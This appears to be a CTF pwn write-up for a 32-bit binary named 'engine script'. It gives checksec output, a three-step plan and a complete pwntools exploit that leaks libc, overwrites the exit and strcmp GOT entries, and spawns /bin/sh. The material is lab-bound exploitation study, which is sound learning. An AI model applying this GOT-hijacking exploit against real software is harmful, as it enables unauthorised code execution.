## Pwn

### engine script

```
// file
es: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6143583db66b843156b693ba272331a4a4b1e28d, not stripped

// checksec
[*] '/home/u1f383/tmp/engine_script/es'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- put `__libc_start_main` => leak libc
- overwrite `exit` got to `main` => code reuse
- overwrite `strcmp` got to `system` => got hijacking

exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./E', env={"LD_PRELOAD": "./libc-2.27.so"})
gdb.attach(r, """
# switch
# b *0x8049524

# g
# b *0x8049574

# p
# b *0x804959d

# exit
b *0x80495a7

c
""")


"""
### stack_ptr is char* ###
a => *stack_ptr += 1 # one byte
d => stack_ptr -= 1 
g => *stack_ptr = getchar()
p => putchar(*stack_ptr)
s => *stack_ptr -= 1
u => stack_ptr += 1 
"""

_scanf_main = 0x80492a7

stack_ptr = 0x804C080
stack = 0x804C0A0

# mov ptr to __libc_main_got
payload = b'g'
payload += (0x804C0A0 - 0x804C080)*b'd'
payload += b'g'

# leak libc
payload += b'pd'*4

# overwrite exit to scanf in main
payload += b'd'*(4+3)
payload += b'gu'*4

# overwrite strcmp to system
payload += b'd'*0x20
payload += b'gu'*4

# trigger exit
payload += b'\xff'

r.sendlineafter("Login: ", "admin")
r.sendlineafter("Password: ", "password")
r.sendafter("Input your code here: ", payload)
r.send(b'\x33')

libc = 0
for _ in range(4):
    libc = libc << 8
    libc += int.from_bytes(r.recv(1), byteorder='little')
libc -= 0x18d90
_system = libc + 0x3cd10
info(f"libc: {hex(libc)}")

for i in range(4):
    r.send(bytes([(_scanf_main >> i*8) & 0xff]))

for i in range(4):
    r.send(bytes([(_system >> i*8) & 0xff]))

r.sendline("/bin/sh")
r.sendline("me0w")

r.interactive()
```